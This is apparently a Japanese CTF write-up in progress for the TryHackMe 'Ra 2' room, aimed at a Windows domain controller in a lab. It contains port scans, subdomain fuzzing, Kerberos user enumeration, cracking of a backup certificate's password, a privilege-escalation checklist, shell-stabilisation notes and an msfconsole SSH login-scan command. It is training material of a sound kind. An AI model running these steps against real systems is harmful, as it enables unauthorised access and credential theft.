# Ra 2 CTF

https://tryhackme.com/room/ra2

## Enumeration

```shell
TARGET=10.48.177.43
sudo bash -c "echo $TARGET   ra2.thm fire.windcorp.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 128
80/tcp    open  http             syn-ack ttl 128
88/tcp    open  kerberos-sec     syn-ack ttl 128
135/tcp   open  msrpc            syn-ack ttl 128
139/tcp   open  netbios-ssn      syn-ack ttl 128
389/tcp   open  ldap             syn-ack ttl 128
443/tcp   open  https            syn-ack ttl 128
445/tcp   open  microsoft-ds     syn-ack ttl 128
464/tcp   open  kpasswd5         syn-ack ttl 128
593/tcp   open  http-rpc-epmap   syn-ack ttl 128
636/tcp   open  ldapssl          syn-ack ttl 128
2179/tcp  open  vmrdp            syn-ack ttl 128
3268/tcp  open  globalcatLDAP    syn-ack ttl 128
3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
3389/tcp  open  ms-wbt-server    syn-ack ttl 128
5222/tcp  open  xmpp-client      syn-ack ttl 128
5223/tcp  open  hpvirtgrp        syn-ack ttl 128
5229/tcp  open  jaxflow          syn-ack ttl 128
5262/tcp  open  unknown          syn-ack ttl 128
5263/tcp  open  unknown          syn-ack ttl 128
5269/tcp  open  xmpp-server      syn-ack ttl 128
5270/tcp  open  xmp              syn-ack ttl 128
5275/tcp  open  unknown          syn-ack ttl 128
5276/tcp  open  unknown          syn-ack ttl 128
7070/tcp  open  realserver       syn-ack ttl 128
7443/tcp  open  oracleas-https   syn-ack ttl 128
7777/tcp  open  cbt              syn-ack ttl 128
9090/tcp  open  zeus-admin       syn-ack ttl 128
9091/tcp  open  xmltec-xmlmail   syn-ack ttl 128
9389/tcp  open  adws             syn-ack ttl 128
49667/tcp open  unknown          syn-ack ttl 128
49668/tcp open  unknown          syn-ack ttl 128
49669/tcp open  unknown          syn-ack ttl 128
49670/tcp open  unknown          syn-ack ttl 128
49671/tcp open  unknown          syn-ack ttl 128
49689/tcp open  unknown          syn-ack ttl 128
49703/tcp open  unknown          syn-ack ttl 128
```

```sh
sudo nmap -sV -p53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5262,5263,5269,5270,5275,5276,7070,7443,7777,9090,9091,9389,49667,49668,49669,49670,49671,49689,49703 $TARGET

PORT      STATE SERVICE             VERSION
53/tcp    open  domain?
80/tcp    open  http                Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec        Microsoft Windows Kerberos (server time: 2026-03-14 00:36:26Z)
135/tcp   open  msrpc               Microsoft Windows RPC
139/tcp   open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp   open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
2179/tcp  open  vmrdp?
3268/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server       Microsoft Terminal Services
5222/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5223/tcp  open  ssl/hpvirtgrp?
5229/tcp  open  jaxflow?
5262/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5263/tcp  open  ssl/unknown
5269/tcp  open  xmpp                Wildfire XMPP Client
5270/tcp  open  ssl/xmp?
5275/tcp  open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
5276/tcp  open  ssl/unknown
7070/tcp  open  http                Jetty 9.4.18.v20190429
7443/tcp  open  ssl/http            Jetty 9.4.18.v20190429
7777/tcp  open  socks5              (No authentication; connection failed)
9090/tcp  open  zeus-admin?
9091/tcp  open  ssl/xmltec-xmlmail?
9389/tcp  open  mc-nmf              .NET Message Framing
49667/tcp open  msrpc               Microsoft Windows RPC
49668/tcp open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc               Microsoft Windows RPC
49670/tcp open  msrpc               Microsoft Windows RPC
49671/tcp open  msrpc               Microsoft Windows RPC
49689/tcp open  msrpc               Microsoft Windows RPC
49703/tcp open  msrpc               Microsoft Windows RPC
```

HTMLから入手したユーザー名

```
organicfish718
organicwolf509
tinywolf424
angrybird253
buse
Edeltraut
Edward
Emile
tinygoose102
brownostrich284
sadswan869
goldencat416
whiteleopard529
happymeercat399
orangegorilla428
```

画像部分から人名

```
Emilieje(Emily Jensen)
lilyleAndSparky(Lily Levesque)
kirkug(Kirk Uglas)
```

サブドメインは画面で見えている2つだけ。

```sh
root@ip-10-49-81-122:~# ffuf -u https://windcorp.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.windcorp.thm' -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : https://windcorp.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.windcorp.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404
________________________________________________

fire                    [Status: 200, Size: 11832, Words: 2298, Lines: 279]
selfservice             [Status: 401, Size: 1293, Words: 81, Lines: 30]
:: Progress: [114532/114532] :: Job [1/1] :: 87 req/sec :: Duration: [0:24:39] :: Errors: 0 ::
```

dirsearch でPowershellのインターフェースを発見。認証画面が表示される。

```sh
[01:54:07] 302 -  168B  - /powershell/  ->  /powershell/default.aspx?ReturnUrl=%2fpowershell%2f
```

### SMB, NFS, LDAP

```sh
enum4linux-ng -A $TARGET

 ===========================================================
|    Domain Information via SMB session for 10.48.177.43    |
 ===========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: FIRE                                                                                         
NetBIOS domain name: WINDCORP                                                                                       
DNS domain: windcorp.thm                                                                                            
FQDN: Fire.windcorp.thm                                                                                             
Derived membership: domain member                                                                                   
Derived domain: WINDCORP
```

無名ログイン不可

```sh
smbclient -L //$TARGET -U ""
smbclient -L //$TARGET -N
```

guest無効

```sh
nxc smb $TARGET -u 'guest' -p '' --shares
```

## kerberos

有効なユーザー名を確認

```sh
$ ~/tools/kerbrute userenum --dc windcorp.thm -d windcorp.thm User.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 03/13/26 - Ronnie Flathers @ropnop

2026/03/13 20:54:15 >  Using KDC(s):
2026/03/13 20:54:15 >   windcorp.thm:88

2026/03/13 20:54:15 >  [+] VALID USERNAME:       Emile@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       organicfish718@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       brownostrich284@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       angrybird253@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       Edeltraut@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       tinygoose102@windcorp.thm
2026/03/13 20:54:15 >  [+] VALID USERNAME:       buse@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       goldencat416@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       sadswan869@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       orangegorilla428@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       emilieje@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       whiteleopard529@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       kirkug@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       happymeercat399@windcorp.thm
2026/03/13 20:54:16 >  [+] VALID USERNAME:       lilyle@windcorp.thm
2026/03/13 20:54:16 >  Done! Tested 19 usernames (15 valid) in 0.295 seconds
```

AS-REP Roasting無効

```sh
$ GetNPUsers.py -dc-ip $TARGET windcorp.thm/ -usersfile names.txt
Impacket v0.14.0.dev0+20260226.31512.9d3d86ea - Copyright Fortra, LLC and its affiliated companies 

[-] User emile doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User organicfish718 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User brownostrich284 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User angrybird253 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Edeltraut doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tinygoose102 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User buse doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User goldencat416 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sadswan869 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User orangegorilla428 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User emilieje doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User whiteleopard529 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User kirkug doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User happymeercat399 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lilyle doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Burpを通さずにHTTPS証明書を確認したところ、selfservice.dev.windcorp.thm が表示されていた。

```
DNS Name: fire.windcorp.thm
DNS Name: selfservice.windcorp.thm
DNS Name: selfservice.dev.windcorp.thm
```

表示したら、工事中の表示。  
dirb で /backup を発見。2ファイル入っていた。web.configはリンク切れ。

```
 5/28/2020  8:41 PM         2827 cert.pfx
 5/28/2020  8:45 PM          168 web.config
```

hashを出力

```sh
$ pfx2john ./cert.pfx > pfx_hash
```

rockyouを使ったら一瞬で終わった。

```sh
$ john --wordlist=/usr/share/wordlists/rockyou.txt ./pfx_hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]          (cert.pfx)     
1g 0:00:00:00 DONE (2026-03-14 23:01) 3.448g/s 7062p/s 7062c/s 7062C/s clover..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```


```sh
# Kerberoasting
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.194.124 -request
```

## 権限昇格

```sh
# env_keep+=LD_PRELOAD は見落としがちなので注意
sudo -l
```

```sh
find / -perm -u=s -type f -ls 2>/dev/null
```

```sh
find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
```

```sh
getcap -r / 2>/dev/null
ls -al /var/backups
cat /etc/crontab
cat /etc/exports
```

どうしても何も見つからない場合の最後の手段として、linpeasのCVEリストに有効なものがないか確認する。

## 振り返り

-
-

## Tags

#tags: #tags: #tags:

```sh
# 大分類（Linuxはタグ付けしない）
Window Kerberos pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM

# 脆弱性の種類
CVE-xxxx-yyyyy カーネルエクスプロイト
ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報 証明書テンプレート

# 攻撃の種類
サービス LFI SSRF XSS SQLインジェクション 競合 認証バイパス フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles

# ツールなど
docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle
```

## メモ

### シェル安定化

```shell
# python が無くても、python3 でいける場合もある
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

# Ctrl+Z でバックグラウンドにした後に
stty raw -echo; fg

#（終了後）エコー無効にして入力非表示になっているので
reset

# まず、他のターミナルを開いて rows, columns の値を調べる
stty -a

# リバースシェルで rows, cols を設定する
stty rows 52
stty cols 236
```

### SSH

ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする

```sh
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
```

エラー

```sh
# no matching host key type found. Their offer: ssh-rsa,ssh-dss
# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
-oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
```
